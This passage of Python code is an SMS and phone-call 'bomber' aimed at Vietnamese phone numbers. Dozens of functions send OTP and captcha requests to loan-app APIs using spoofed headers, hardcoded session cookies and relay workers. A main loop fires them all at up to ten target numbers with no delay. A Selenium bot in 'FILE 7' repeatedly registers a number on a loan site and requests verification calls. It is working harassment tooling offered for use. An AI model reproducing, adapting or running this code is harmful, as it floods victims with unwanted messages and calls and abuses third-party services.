        "app_package_name": "com.maritme.assrt.vn",
        "platform": "android",
        "app_id": "266000001",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://mvvii.marttimeassrt.com/v2/login/captcha",
            json={**payload, "type": 2},
            headers=headers,
        )

async def call10(phone_otp):
    headers = {
        "Accept": "*/*",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "x-client-type": "phone",
        "Origin": "https://android.vaycash.net",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "Referer": "https://android.vaycash.net/",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "Cookie": "HWWAFSESID=63f6c7f810288e2923; HWWAFSESTIME=1774426765256; PHPSESSID=7aaeabbc2187eeaf2633fb3b2890f364",
    }
    payload = {
        "country_code": "vi",
        "app_name": "VayCash",
        "app_package_name": "com.vaycash.finance.credit",
        "platform": "ios",
        "app_id": "221000000",
        "phone": phone_otp,
    }
    async with httpx.AsyncClient() as client:
        res1 = await client.post(
            "https://api.vaycash.net/v2/login/captcha",
            json={**payload, "type": 1},
            headers=headers,
        )
        res2 = await client.post(
            "https://api.vaycash.net/v2/login/captcha",
            json={**payload, "type": 2},
            headers=headers,
        )

async def call10_alt(phone_otp):
    headers = {
        "Accept": "*/*",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "x-client-type": "phone",
        "Origin": "https://android.vaycash.net",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "Referer": "https://android.vaycash.net/",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "Cookie": "HWWAFSESID=63f6c7f810288e2923; HWWAFSESTIME=1774426765256; PHPSESSID=7aaeabbc2187eeaf2633fb3b2890f364",
    }
    payload = {
        "country_code": "vi",
        "app_name": "VayCash",
        "app_package_name": "com.vaycash.finance.credit",
        "platform": "ios",
        "app_id": "221000001",
        "phone": phone_otp,
    }
    async with httpx.AsyncClient() as client:
        res = await client.post(
            "https://notice.vaycash.net/v2/login/captcha",
            json=payload,
            headers=headers,
        )

async def call11(phone_otp):
    headers = build_headers("https://ios-h5.kasikvayfinance.com")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "Kasik Vay",
        "app_package_name": "credit.kasikvay.ssef",
        "platform": "ios",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://vkfai.kasikvayfinance.com/v2/login/captcha",
            json={**payload, "type": 1, "app_id": "233000000"},
            headers=headers,
        )

async def call11_alt(phone_otp):
    headers = build_headers("https://ios-h5.kasikvayfinance.com")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "Kasik Vay",
        "app_package_name": "credit.kasikvay.ssef",
        "platform": "ios",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://vkfii.kasikvayfinance.com/v2/login/captcha",
            json={**payload, "type": 2, "app_id": "233000001"},
            headers=headers,
        )

async def call12(phone_otp):
    headers = build_headers("http://sumhanoivn.com", mode="android")
    headers["x-client-type"] = "phone"
    payload = {
        "phone": phone_otp,
        "platform": "ios",
        "app_name": "Mitsui Vay",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "http://vishi.sumhanoivn.com/v2/login/captcha",
            json={**payload, "type": 2, "app_id": "231000001"},
            headers=headers,
        )

async def call12_alt(phone_otp):
    headers = build_headers("http://sumhanoivn.com", mode="android")
    headers["x-client-type"] = "phone"
    payload = {
        "phone": phone_otp,
        "platform": "ios",
        "app_name": "Mitsui Vay",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "http://vashi.sumhanoivn.com/v2/login/captcha",
            json={**payload, "app_id": "231000000"},
            headers=headers,
        )

async def call13(phone_otp):
    headers = build_headers("https://vn-android-topqcash-net.pages.dev")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "QCash",
        "type": 2,
        "app_package_name": "business.qcash.hbuy",
        "platform": "android",
        "app_id": "227000000",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://vatqi.topqcash.net/v2/login/captcha",
            json=payload,
            headers=headers
        )

async def call13_alt(phone_otp):
    headers = build_headers("https://iosweb.topqcash.net/#/login")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "QCash",
        "app_package_name": "business.qcash.hbuy",
        "type": 2,
        "platform": "ios",
        "app_id": "227000001",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://vitqi.topqcash.net/v2/login/captcha",
            headers=headers,
            json=payload
        )

async def call14(phone_otp):
    headers = build_headers("https://android.umoneynv.net")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "U Money",
        "app_package_name": "com.u.money.cash.loan.credit",
        "platform": "android",
        "download": "https://dzqjvjgi3bn5t.cloudfront.net/UMoney.apk"
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://api.umoneynv.net/v2/login/captcha",
            json={**payload, "type": 2, "app_id": "2700000000"},
            headers=headers,
        )

async def call14_alt(phone_otp):
    headers = build_headers("https://android.umoneynv.net")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "U Money",
        "app_package_name": "com.u.money.cash.loan.credit",
        "platform": "android",
        "download": "https://dzqjvjgi3bn5t.cloudfront.net/UMoney.apk"
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "http://h5api.umoneynv.net/v2/login/captcha",
            json={**payload, "type": 2, "app_id": "2700000001"},
            headers=headers,
        )

async def call15(phone_otp):
    headers = build_headers("https://android-h5.truongtaionline.com")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "Truong Tai Money",
        "app_package_name": "truong.tai.phat.online",
        "platform": "android",
        "app_id": "242000000",
    }
    async with httpx.AsyncClient() as client:
        res1 = await client.post(
            "https://vgtai.truongtaionline.com/v2/login/captcha",
            json={**payload, "type": 1},
            headers=headers,
        )
        r = await client.post(
            "https://vgtai.truongtaionline.com/v2/login/captcha",
            json={**payload, "type": 2},
            headers=headers,
        )

async def call16(phone_otp):
    headers = build_headers("https://android-h5.dhloantrading.com")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "DH Loan",
        "app_package_name": "com.dhloan.trading.vaynhanh",
        "platform": "android",
    }
    async with httpx.AsyncClient() as client:
        r1 = await client.post(
            "https://dtaiv.dhloantrading.com/v2/login/captcha",
            json={**payload, "type": 2, "app_id": "243000000"},
            headers=headers,
        )
        r2 = await client.post(
            "https://dtiiv.dhloantrading.com/v2/login/captcha",
            json={**payload, "type": 2, "app_id": "243000001"},
            headers=headers,
        )

async def call17(phone_otp):
    headers = build_headers("https://vn-ios-h5-sunmobile.pages.dev")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "Sun Mobile",
        "app_package_name": "sunvay.online",
        "platform": "ios",
        "app_id": "238000001",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://sciiv.sunmobilefinance.com/v2/login/captcha",
            json=payload,
            headers=headers,
        )

async def call17_alt(phone_otp):
    headers = build_headers("https://vn-android-h5-sunmobile.pages.dev")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "Sun Mobile",
        "app_package_name": "sunvay.online",
        "platform": "android",
        "app_id": "238000000",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://scaiv.sunmobilefinance.com/v2/login/captcha",
            json={**payload, "type": 2},
            headers=headers,
        )

async def call18(phone_otp):
    headers = build_headers("https://vn-android-gbcreditvn-net.pages.dev")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "GbCredit",
        "app_package_name": "com.gbcredit.money.cash",
        "platform": "android",
        "app_id": "2900000000",
        "download": "https://dzqjvjgi3bn5t.cloudfront.net/GbCredit.apk"
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://api.gbcreditvn.net/v2/login/captcha",
            json=payload,
            headers=headers,
        )

async def call18_alt(phone_otp):
    headers = build_headers("https://vn-android-gbcreditvn-net.pages.dev")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "GbCredit",
        "app_package_name": "com.gbcredit.money.cash",
        "platform": "android",
        "app_id": "2900000000",
        "download": "https://dzqjvjgi3bn5t.cloudfront.net/GbCredit.apk"
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://api.gbcreditvn.net/v2/login/captcha",
            json={**payload, "type": 2},
            headers=headers,
        )

async def call19(phone_otp):
    headers = build_headers("https://bsawv.subkamolplus.com")
    payload = {"phone": phone_otp, "country_code": "vi", "app_name": "Subkamol Lending", "app_package_name": "com.subkamol.lending.sofn", "platform": "android", "app_id": "244000000"}
    try:
        async with httpx.AsyncClient() as client:
            r = await client.post("https://bsaiv.subkamolplus.com/v2/login/captcha", json=payload, headers=headers)
    except:
        pass

async def call19_alt(phone_otp):
    headers = build_headers("https://bsawv.subkamolplus.com")
    payload = {"phone": phone_otp, "country_code": "vi", "app_name": "Subkamol Lending", "app_package_name": "com.subkamol.lending.sofn", "platform": "android", "app_id": "244000000", "type": 2}
    try:
        async with httpx.AsyncClient() as client:
            r = await client.post("https://bsiiv.subkamolplus.com/v2/login/captcha", json=payload, headers=headers)
    except:
        pass

async def call20(phone_otp):
    headers = build_headers("https://android-h5.bonmoneydile.com", mode="android")
    headers["x-client-type"] = "phone"
    payload = {
        "phone": phone_otp,
        "platform": "android",
        "app_name": "Bon Money",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://bmvai.bonmoneydile.com/v2/login/captcha",
            json={**payload, "type": 2, "app_id": "260000000"},
            headers=headers,
        )

async def call20_alt(phone_otp):
    headers = build_headers("https://android-h5.bonmoneydile.com", mode="android")
    headers["x-client-type"] = "phone"
    payload = {
        "phone": phone_otp,
        "platform": "android",
        "app_name": "Bon Money",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://bmvii.bonmoneydile.com/v2/login/captcha",
            json={**payload, "type": 2, "app_id": "260000001"},
            headers=headers,
        )

async def call21(phone_otp):
    headers = build_headers("https://vn-android-h5-nathco-vay.pages.dev")
    payload = {
        "country_code": "vn",
        "phone": phone_otp,
        "app_name": "Nathco Vay",
        "app_package_name": "com.artmis.dong.vn",
        "platform": "android",
    }
    async with httpx.AsyncClient() as client:
        res = await client.post(
            "https://oyvai.nathcopay.com/v2/login/captcha",
            json={**payload, "app_id": "235000000"},
            headers=headers,
        )

async def call21_alt(phone_otp):
    headers = build_headers("https://vn-android-h5-nathco-vay.pages.dev")
    payload = {
        "country_code": "vn",
        "phone": phone_otp,
        "app_name": "Nathco Vay",
        "app_package_name": "com.artmis.dong.vn",
        "platform": "android",
    }
    async with httpx.AsyncClient() as client:
        res = await client.post(
            "https://oyvii.nathcopay.com/v2/login/captcha",
            json={**payload, "type": 2, "app_id": "235000001"},
            headers=headers,
        )

async def call22(phone_otp):
    headers = build_headers("https://android-h5.microfinmobile.com")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "Microfin Mobile",
        "app_package_name": "microfin.moblie.thpay",
        "platform": "android",
        "app_id": "239000000",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://mbaiv.microfinmobile.com/v2/login/captcha",
            json=payload,
            headers=headers,
        )

async def call22_alt(phone_otp):
    headers = build_headers("https://android-h5.microfinmobile.com")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "Microfin Mobile",
        "app_package_name": "microfin.moblie.thpay",
        "platform": "android",
        "app_id": "239000000",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://mbaiv.microfinmobile.com/v2/login/captcha",
            json={**payload, "type": 2},
            headers=headers,
        )

async def call23(phone_otp):
    headers = build_headers("https://vn-android-gbcreditvn-net.pages.dev")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "OKCredit",
        "app_package_name": "com.OKCredit.loan.cash",
        "platform": "android",
        "app_id": "2100000000",
        "download": "https://dzqjvjgi3bn5t.cloudfront.net/OKCredit.apk"
    }
    async with httpx.AsyncClient() as client:
        res = await client.post(
            "https://api.getokcredit.net/v2/login/captcha",
            json={**payload, "type": 2},
            headers=headers,
        )

async def call_mydong(phone_otp):
    headers = build_headers("https://android.mydonny.net/")
    payload = {"phone": phone_otp, "country_code": "vi", "app_name": "Mydong", "app_package_name": "com.mydong.credit.money", "platform": "android", "app_id": "2400000000", "download": "https://dzqjvjgi3bn5t.cloudfront.net/Mydong.apk"}
    try:
        async with httpx.AsyncClient() as client:
            r = await client.post("https://notice.mydonny.net/v2/login/captcha", json=payload, headers=headers)
    except:
        pass

async def call_mydong_alt(phone_otp):
    headers = build_headers("https://android.mydonny.net/")
    payload = {"phone": phone_otp, "country_code": "vi", "app_name": "Mydong", "app_package_name": "com.mydong.credit.money", "platform": "android", "app_id": "2400000000", "download": "https://dzqjvjgi3bn5t.cloudfront.net/Mydong.apk"}
    try:
        async with httpx.AsyncClient() as client:
            r = await client.post("https://api.mydonny.net/v2/login/captcha", json=payload, headers=headers)
    except:
        pass

async def vay24h(phone_otp: str):
    CF_URL = [
        "https://ok-6fb5.cotenhp2888.workers.dev",
        "https://doaxa--71c050ce533111f1bce0ee650bb23af1.web.val.run"
    ]
    BASE_URL = random.choice(CF_URL)
    async with httpx.AsyncClient(timeout=30) as client:
        r = await client.get(BASE_URL, params={"phone": phone_otp, "fn": "vay24h"})
        return r.json()

async def uvwallet(phone_otp: str):
    CF_URL = [
        "https://ok-6fb5.cotenhp2888.workers.dev",
        "https://doaxa--71c050ce533111f1bce0ee650bb23af1.web.val.run"
    ]
    BASE_URL = random.choice(CF_URL)
    async with httpx.AsyncClient(timeout=30) as client:
        r = await client.get(BASE_URL, params={"phone": phone_otp, "fn": "uvwallet"})
        return r.json()

async def itake(phone_otp):
    KEY = b"aajiaozicashmeh5"
    IV  = b"hajiaozicashmeh5"

    def aes_encrypt(payload):
        raw = json.dumps(payload, separators=(",", ":")).encode()
        cipher = AES.new(KEY, AES.MODE_CBC, IV)
        encrypted = cipher.encrypt(pad(raw, AES.block_size))
        return base64.b64encode(encrypted).decode()

    mobile = "84" + phone_otp.lstrip("0")
    payload = {
        "phone": mobile,
        "isVoice": False,
        "h5": False,
        "deviceId": ""
    }

    body = aes_encrypt(payload)

    headers = {
        "fpPlatform": "5",
        "appId": "20",
        "language": "vi-VN",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
        "Referer": "https://h5.6itake-moment.com/login",
        "country": "undefined",
        "Origin": "https://h5.6itake-moment.com",
        "Sec-Fetch-Dest": "empty",
        "fpDeviceId": "",
        "version": "1.0.0_4.0.4",
        "Sec-Fetch-Site": "same-origin",
        "fingerPrint": "",
        "deviceId": "",
        "platform": "2",
        "token": "undefined",
        "x_x_path": "YCoyft17omVLyvU9+jEIkcL8RUweszQyIGJ8TDVcaw0=",
        "loginPlatform": "H5",
        "marketToken": "undefined",
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Sec-Fetch-Mode": "cors",
        "Accept-Language": "vi-VN,vi;q=0.9",
    }

    async with httpx.AsyncClient(timeout=30) as client:
        r = await client.post(
            "https://h5.6itake-moment.com/h5/3tcobpsevujcfu4ga4qpdeaddh0gdhd4",
            headers=headers,
            data=body,
        )

        print("STATUS:", r.status_code)


async def main_6():
    if len(sys.argv) < 2:
        print("Usage: python main.py <sdt1> [sdt2] ... [sdt10] <so_lan>")
        print("Hoặc: python main.py <so_lan> <sdt1> [sdt2] ...")
        sys.exit(1)
    
    try:
        so_lan = int(sys.argv[-1])
        phone_otps = sys.argv[1:-1]
    except ValueError:
        so_lan = 1
        phone_otps = sys.argv[1:11]
    
    if len(phone_otps) > 10:
        print("Warning: Chỉ hỗ trợ tối đa 10 số điện thoại")
        phone_otps = phone_otps[:10]
    
    if not phone_otps:
        print("Usage: python main.py <sdt1> [sdt2] ... [sdt10] <so_lan>")
        print("Hoặc: python main.py <so_lan> <sdt1> [sdt2] ...")
        sys.exit(1)
    
    print(f"Số điện thoại: {phone_otps}")
    print(f"Số lần chạy: {so_lan}")
    
    all_funcs = [
        (itake, 0),
        (vay24h, 0),
        (htc_sms, 0),
        (vncredit_sms, 0),
        (call_mfast360, 0),
        (call_vaydep365, 0),
        (qq_sms, 0),
        (call2, 0),
        (mfast, 0),
        (lavi_sms, 0),
        (call13, 0),
        (call3, 0),
        (ptvay_sms, 0),
        (call_senvay, 0),
        (call_hoivan, 0),
        (vncredit_voice, 0),
        (call21, 0),
        (combo2, 0),
        (uvwallet, 0),
        (call1, 0),
        (combo1, 0),
        (achau_sms, 0),
        (call14_alt, 0),
        (petro_sms, 0),
        (call_mydong, 0),
        (call_mydong_alt, 0),
        (call20, 0),
        (call8, 0),
        (call9, 0),
        (call11, 0),
        (call12, 0),
        (random_site, 0),
        (call_hoivan_alt, 0),
        (call12_alt, 0),
        (call14, 0),
        (call10, 0),
        (call19, 0),
        (call11_alt, 0),
        (call18, 0),
        (call15, 0),
        (call20_alt, 0),
        (call16, 0),
        (call22_alt, 0),
        (call19_alt, 0),
        (call17, 0),
        (call23, 0),
        (call22, 0),
        (call21_alt, 0),
        (call13_alt, 0),
        (call18_alt, 0),
        (call10_alt, 0),
        (call17_alt, 0)
    ]
    
    async def safe_call(func, phone_otp, lan_thu):
        try:
            await func(phone_otp)
            print(f"[{func.__name__}] - SĐT: {phone_otp} - Lần {lan_thu} - Thành công")
        except Exception as e:
            print(f"[{func.__name__}] - SĐT: {phone_otp} - Lần {lan_thu} - Lỗi: {str(e)[:50]}")
    
    for lan in range(1, so_lan + 1):
        print(f"\n{'='*60}")
        print(f"BẮT ĐẦU LẦN CHẠY {lan}/{so_lan}")
        print(f"{'='*60}\n")
        
        for f_idx, (func, sleep_time) in enumerate(all_funcs, 1):
            tasks = []
            for phone in phone_otps:
                tasks.append(safe_call(func, phone, lan))
            
            await asyncio.gather(*tasks)
            
            if f_idx < len(all_funcs):
                delay = random.uniform(sleep_time, sleep_time + 0)
                print(f"[{func.__name__}] Vòng {f_idx}/{len(all_funcs)} - Nghỉ {delay:.2f}s")
                await asyncio.sleep(delay)
        
        print(f"\n{'='*60}")
        print(f"HOÀN THÀNH LẦN CHẠY {lan}/{so_lan}")
        print(f"{'='*60}\n")
        
        if lan < so_lan:
            nghi_giua_lan = random.uniform(0, 0)
            print(f"Nghỉ giữa lần chạy {lan} và {lan+1}: {nghi_giua_lan:.2f}s")
            await asyncio.sleep(nghi_giua_lan)


# ============================================================
# FILE 7
# ============================================================
import time
import sys
import subprocess
import importlib
import os

# ===== TỰ ĐỘNG CÀI ĐẶT THƯ VIỆN =====
def auto_install_packages():
    """Tự động kiểm tra và cài đặt các thư viện cần thiết"""
    packages = ['selenium', 'pyperclip']
    
    for package in packages:
        try:
            importlib.import_module(package)
            print(f"✅ {package} đã được cài đặt")
        except ImportError:
            print(f"📦 Đang cài đặt {package}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
            print(f"✅ Đã cài đặt {package}")

# Tự động cài đặt thư viện
auto_install_packages()

# Import sau khi đã cài đặt
import pyperclip
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.edge.options import Options
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC


class VayXanhBot:
    def __init__(self, so_dien_thoai, so_lan_lap):
        self.so_dien_thoai = so_dien_thoai
        self.so_lan_lap = so_lan_lap
        self.thanh_cong = 0
        self.that_bai = 0
        
    def setup_driver(self):
        options = Options()
        options.add_argument("--start-maximized")
        options.add_argument("--disable-notifications")
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        return webdriver.Edge(options=options)
    
    def nhap_so_dien_thoai(self, driver, wait):
        """Nhập số điện thoại vào form"""
        try:
            time.sleep(2)
            
            selectors = [
                "//input[@placeholder='Nhập số điện thoại *']",
                "//input[@id='form-field-loan_phone']",
                "//input[@type='tel']",
                "//input[contains(@placeholder, 'điện thoại')]",
                "//input[contains(@placeholder, 'phone')]",
                "//input[@name='phone']",
                "//input[@name='loan_phone']"
            ]
            
            so_dt_input = None
            for selector in selectors:
                try:
                    so_dt_input = driver.find_element(By.XPATH, selector)
                    if so_dt_input and so_dt_input.is_displayed():
                        break
                except:
                    continue
            
            if not so_dt_input:
                print("❌ Không tìm thấy input số điện thoại")
                return False
            
            driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", so_dt_input)
            time.sleep(0.5)
            driver.execute_script("arguments[0].click();", so_dt_input)
            time.sleep(0.5)
            driver.execute_script("arguments[0].value = '';", so_dt_input)
            time.sleep(0.3)
            driver.execute_script(f"arguments[0].value = '{self.so_dien_thoai}';", so_dt_input)
            time.sleep(0.3)
            
            driver.execute_script("""
                var element = arguments[0];
                element.dispatchEvent(new Event('input', { bubbles: true }));
                element.dispatchEvent(new Event('change', { bubbles: true }));
            """, so_dt_input)
            
            print(f"✅ Đã nhập số điện thoại: {self.so_dien_thoai}")
            return True
            
        except Exception as e:
            print(f"❌ Lỗi nhập số điện thoại: {e}")
            return False
    
    def click_dang_ky(self, driver, wait):
        """Click nút Đăng ký"""
        try:
            print("🔍 Đang tìm nút Đăng ký...")
            
            selectors = [
                "//button[normalize-space()='Đăng ký']",
                "//button[normalize-space()='ĐĂNG KÝ']",
                "//button[contains(text(), 'Đăng ký')]",
                "//button[contains(text(), 'ĐĂNG KÝ')]",
                "//form//button[contains(text(), 'Đăng ký')]",
                "//form//button[contains(text(), 'ĐĂNG KÝ')]",
                "//button[contains(@class, 'register')]",
                "//button[contains(@class, 'btn-register')]",
                "//button[@type='submit']"
            ]
            
            for selector in selectors:
                try:
                    dang_ky_btn = driver.find_element(By.XPATH, selector)
                    if dang_ky_btn and dang_ky_btn.is_displayed():
                        text = dang_ky_btn.text.strip()
                        print(f"✅ Tìm thấy nút: '{text}'")
                        
                        if 'vay' in text.lower() and 'đăng' not in text.lower():
                            print(f"⚠️ Bỏ qua '{text}' vì là Vay ngay")
                            continue
                        
                        driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", dang_ky_btn)
                        time.sleep(1)
                        driver.execute_script("arguments[0].click();", dang_ky_btn)
                        print(f"✅ Đã click nút: '{text}'")
                        return True
                except:
                    continue
            
            print("❌ Không tìm thấy nút Đăng ký")
            return False
            
        except Exception as e:
            print(f"❌ Lỗi click Đăng ký: {e}")
            return False
    
    def click_nhan_cuoc_goi(self, driver, wait):
        """Click nút Nhận cuộc gọi - SỬA LỖI HOÀN TOÀN"""
        try:
            print("⏳ Đợi trang xác thực load...")
            time.sleep(3)
            
            # Lưu ảnh để kiểm tra
            driver.save_screenshot("trang_xac_thuc.png")
            print("📸 Đã lưu ảnh: trang_xac_thuc.png")
            
            print(f"📍 URL hiện tại: {driver.current_url}")
            
            # === CÁCH 1: Tìm button trực tiếp từ danh sách đã có ===
            print("\n📞 Cách 1: Click trực tiếp từ danh sách button...")
            try:
                # Lấy tất cả button
                buttons = driver.find_elements(By.TAG_NAME, "button")
                print(f"📊 Tìm thấy {len(buttons)} button")
                
                for i, btn in enumerate(buttons):
                    try:
                        text = btn.text.strip()
                        print(f"   Button {i+1}: '{text}'")
                        
                        # Nếu là nút Nhận cuộc gọi
                        if 'Nhận cuộc gọi' in text or 'NHẬN CUỘC GỌI' in text:
                            print(f"✅ Tìm thấy nút: '{text}'")
                            # Scroll và click
                            driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", btn)
                            time.sleep(1)
                            driver.execute_script("arguments[0].click();", btn)
                            print("✅ Đã click nút Nhận cuộc gọi (Cách 1)")
                            return True
                    except:
                        continue
            except Exception as e:
                print(f"⚠️ Cách 1 thất bại: {e}")
            
            # === CÁCH 2: Dùng WebDriverWait ===
            print("\n📞 Cách 2: Dùng WebDriverWait...")
            try:
                btn = WebDriverWait(driver, 10).until(
                    EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'Nhận cuộc gọi')]"))
                )
                if btn:
                    driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", btn)
                    time.sleep(1)
                    driver.execute_script("arguments[0].click();", btn)
                    print("✅ Đã click nút Nhận cuộc gọi (Cách 2)")
                    return True
            except Exception as e:
                print(f"⚠️ Cách 2 thất bại: {e}")
            
            # === CÁCH 3: Tìm bằng CSS selector ===
            print("\n📞 Cách 3: Tìm bằng CSS selector...")
            try:
                btn = driver.find_element(By.CSS_SELECTOR, "button[class*='call'], button[class*='receive'], button[class*='otp']")
                if btn and btn.is_displayed():
                    text = btn.text.strip()
                    print(f"✅ Tìm thấy nút: '{text}'")
                    driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", btn)
                    time.sleep(1)
                    driver.execute_script("arguments[0].click();", btn)
                    print("✅ Đã click nút (Cách 3)")
                    return True
            except Exception as e:
                print(f"⚠️ Cách 3 thất bại: {e}")
            
            # === CÁCH 4: Tìm bằng XPath không phân biệt chữ hoa/thường ===
            print("\n📞 Cách 4: Tìm bằng XPath không phân biệt chữ hoa/thường...")
            try:
                btn = driver.find_element(By.XPATH, "//button[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'nhận cuộc gọi')]")
                if btn and btn.is_displayed():
                    text = btn.text.strip()
                    print(f"✅ Tìm thấy nút: '{text}'")
                    driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", btn)
                    time.sleep(1)
                    driver.execute_script("arguments[0].click();", btn)
                    print("✅ Đã click nút (Cách 4)")
                    return True
            except Exception as e:
                print(f"⚠️ Cách 4 thất bại: {e}")
            
            # === CÁCH 5: Tìm bằng tất cả phần tử có text ===
            print("\n📞 Cách 5: Tìm bằng tất cả phần tử có text...")
            try:
                elements = driver.find_elements(By.XPATH, "//*[contains(text(), 'Nhận cuộc gọi') or contains(text(), 'NHẬN CUỘC GỌI')]")
                for elem in elements:
                    if elem.is_displayed():
                        text = elem.text.strip()
                        print(f"✅ Tìm thấy element: '{text}'")
                        # Nếu là button thì click, nếu không thì click vào parent
                        if elem.tag_name == 'button':
                            driver.execute_script("arguments[0].click();", elem)
                        else:
                            parent = elem.find_element(By.XPATH, "..")
                            if parent.tag_name == 'button':
                                driver.execute_script("arguments[0].click();", parent)
                            else:
                                driver.execute_script("arguments[0].click();", elem)
                        print("✅ Đã click (Cách 5)")
                        return True
            except Exception as e:
                print(f"⚠️ Cách 5 thất bại: {e}")
            
            # === CÁCH 6: Gửi sự kiện click qua JavaScript ===
            print("\n📞 Cách 6: Gửi sự kiện click qua JavaScript...")
            try:
                btn = driver.find_element(By.XPATH, "//button[contains(text(), 'Nhận cuộc gọi')]")
                driver.execute_script("""
                    var event = new MouseEvent('click', {
                        view: window,
                        bubbles: true,
                        cancelable: true
                    });
                    arguments[0].dispatchEvent(event);
                """, btn)
                print("✅ Đã gửi sự kiện click (Cách 6)")
                return True
            except Exception as e:
                print(f"⚠️ Cách 6 thất bại: {e}")
            
            # === CÁCH 7: Click bằng ActionChains với offset ===
            print("\n📞 Cách 7: Click bằng ActionChains với offset...")
            try:
                btn = driver.find_element(By.XPATH, "//button[contains(text(), 'Nhận cuộc gọi')]")
                if btn:
                    actions = ActionChains(driver)
                    actions.move_to_element(btn).click().perform()
                    print("✅ Đã click bằng ActionChains (Cách 7)")
                    return True
            except Exception as e:
                print(f"⚠️ Cách 7 thất bại: {e}")
            
            # === CÁCH 8: Thử click nhiều lần ===
            print("\n📞 Cách 8: Click nhiều lần...")
            try:
                btn = driver.find_element(By.XPATH, "//button[contains(text(), 'Nhận cuộc gọi')]")
                for i in range(5):
                    try:
                        driver.execute_script("arguments[0].click();", btn)
                        print(f"✅ Click lần {i+1} thành công")
                        time.sleep(0.3)
                    except:
                        pass
                return True
            except Exception as e:
                print(f"⚠️ Cách 8 thất bại: {e}")
            
            print("\n❌ TẤT CẢ CÁCH ĐỀU THẤT BẠI")
            print("💡 Kiểm tra file 'trang_xac_thuc.png' để xem giao diện")
            return False
            
        except Exception as e:
            print(f"❌ Lỗi click Nhận cuộc gọi: {e}")
            return False
    
    def kiem_tra_trang_thai(self, driver):
        """Kiểm tra trạng thái trang"""
        try:
            time.sleep(2)
            current_url = driver.current_url
            print(f"📍 URL hiện tại: {current_url}")
            
            # Kiểm tra popup đăng nhập
            try:
                popup = driver.find_element(By.XPATH, "//div[contains(text(), 'ĐĂNG NHẬP')]")
                if popup and popup.is_displayed():
                    print("⚠️ PHÁT HIỆN POPUP ĐĂNG NHẬP - Số đã đăng ký")
                    return "dang_nhap"
            except:
                pass
            
            # Kiểm tra trang xác thực
            if 'xac-thuc' in current_url or 'verify' in current_url or 'otp' in current_url:
                return "xac_thuc"
            
            return "trang_chu"
            
        except Exception as e:
            print(f"⚠️ Lỗi kiểm tra: {e}")
            return "loi"
    
    def dong_popup(self, driver):
        """Đóng popup"""
        try:
            selectors = [
                "//button[contains(@class, 'close')]",
                "//*[contains(@class, 'modal-close')]",
                "//*[contains(text(), '×')]",
                "//button[contains(text(), 'Đóng')]",
                "//button[contains(text(), 'Hủy bỏ')]"
            ]
            
            for selector in selectors:
                try:
                    popup = driver.find_element(By.XPATH, selector)
                    if popup and popup.is_displayed():
                        driver.execute_script("arguments[0].click();", popup)
                        time.sleep(0.5)
                        print("✅ Đã đóng popup")
                        return True
                except:
